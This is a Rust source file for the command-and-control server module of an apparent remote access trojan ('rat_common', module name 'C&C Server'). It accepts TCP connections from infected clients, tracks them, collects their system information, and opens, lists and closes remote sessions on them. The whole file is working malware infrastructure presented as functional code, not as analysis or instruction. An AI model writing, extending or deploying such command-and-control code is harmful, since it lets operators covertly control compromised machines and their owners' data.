mod client;
mod listener;
mod ping;

use std::collections::HashMap;
use std::collections::hash_map::Entry;
use std::io;
use std::net::SocketAddr;
use std::sync::Arc;

use async_trait::async_trait;
use log::{debug, warn};
use rat_common::framework::{ModuleImpl, ModuleState};
use rat_common::schema::{
    ClientMessageData, ServerMessage, ServerMessageData, SessionCreateRequest, SessionInput,
    SessionMetadata, SystemInfo,
};
use rat_common::snowflake::SnowflakeId;
use tokio::net::{TcpListener, TcpStream, ToSocketAddrs};
use tokio::sync::RwLock;

use crate::config::Config;
use crate::modules::cc::client::ClientConnector;

pub struct CCServer {
    _listener: TcpListener,
    _config: Config,
    _clients: RwLock<HashMap<SocketAddr, Arc<ClientConnector>>>,
    _state: Arc<ModuleState>,
}

impl CCServer {
    pub async fn bind<A: ToSocketAddrs>(addr: A, config: Config) -> anyhow::Result<Arc<Self>> {
        let listener = TcpListener::bind(addr).await?;
        Ok(Arc::new(Self {
            _listener: listener,
            _config: config,
            _clients: RwLock::new(HashMap::new()),
            _state: ModuleState::new(),
        }))
    }

    pub async fn get_clients(&self) -> Vec<(SocketAddr, Option<SystemInfo>)> {
        let clients = self._clients.read().await;
        let mut result = Vec::with_capacity(clients.len());
        for (addr, client) in clients.iter() {
            result.push((*addr, client.info().await));
        }

        result
    }

    pub async fn get_clients_addr(&self, addr: &SocketAddr) -> Option<Option<SystemInfo>> {
        let entry = {
            let clients = self._clients.read().await;
            clients.get(addr).cloned()
        };

        match entry {
            Some(client) => Some(client.info().await),
            None => None,
        }
    }

    pub async fn get_clients_addr_sessions(
        &self,
        addr: &SocketAddr,
    ) -> anyhow::Result<Option<Vec<Arc<SessionMetadata>>>> {
        let entry = {
            let clients = self._clients.read().await;
            clients.get(addr).cloned()
        };

        match entry {
            Some(client) => {
                let response = client
                    .request(&ServerMessage::new(ServerMessageData::SessionQuery))
                    .await?;

                if let ClientMessageData::SessionQueryResponse { sessions } = response.data {
                    Ok(Some(sessions))
                } else {
                    Err(anyhow::anyhow!(
                        "Unexpected response from client: {response:?}"
                    ))
                }
            }
            None => Ok(None),
        }
    }

    pub async fn post_clients_addr_sessions(
        &self,
        addr: &SocketAddr,
        request: SessionCreateRequest,
    ) -> anyhow::Result<Option<Arc<SessionMetadata>>> {
        let entry = {
            let clients = self._clients.read().await;
            clients.get(addr).cloned()
        };

        match entry {
            Some(client) => {
                let response = client
                    .request(&ServerMessage::new(ServerMessageData::SessionCreate {
                        request,
                    }))
                    .await?;

                if let ClientMessageData::SessionCreateResponse { session } = response.data {
                    Ok(Some(session))
                } else {
                    Err(anyhow::anyhow!(
                        "Unexpected response from client: {response:?}"
                    ))
                }
            }
            None => Ok(None),
        }
    }

    pub async fn delete_clients_addr_sessions_session_id(
        &self,
        addr: &SocketAddr,
        session_id: SnowflakeId,
    ) -> anyhow::Result<Option<()>> {
        let entry = {
            let clients = self._clients.read().await;
            clients.get(addr).cloned()
        };

        match entry {
            Some(client) => {
                let response = client
                    .request(&ServerMessage::new(ServerMessageData::SessionInput {
                        session_id,
                        input: SessionInput::Close,
                    }))
                    .await?;

                if let ClientMessageData::SessionInputResponse = response.data {
                    Ok(Some(()))
                } else {
                    Err(anyhow::anyhow!(
                        "Unexpected response from client: {response:?}"
                    ))
                }
            }
            None => Ok(None),
        }
    }
}

#[async_trait]
impl ModuleImpl for CCServer {
    type EventType = io::Result<(TcpStream, SocketAddr)>;

    fn name(&self) -> &str {
        "C&C Server"
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        self._listener.accept().await
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        let (stream, addr) = event?;

        let mut clients = self._clients.write().await;
        if let Entry::Vacant(e) = clients.entry(addr) {
            let client = ClientConnector::new(stream, addr, self._config);
            self.add_submodule(client.clone()).await;
            e.insert(client.clone());

            debug!("Accepted new connection from {addr}");

            client.update_system_info().await?;
        } else {
            warn!("Client {addr} is trying to connect more than once. Ignoring.");
        }

        Ok(())
    }

    async fn submodules_remove_hook(self: Arc<Self>) -> anyhow::Result<()> {
        let mut clients = self._clients.write().await;
        clients.retain(|_, client| client.is_running());
        Ok(())
    }
}
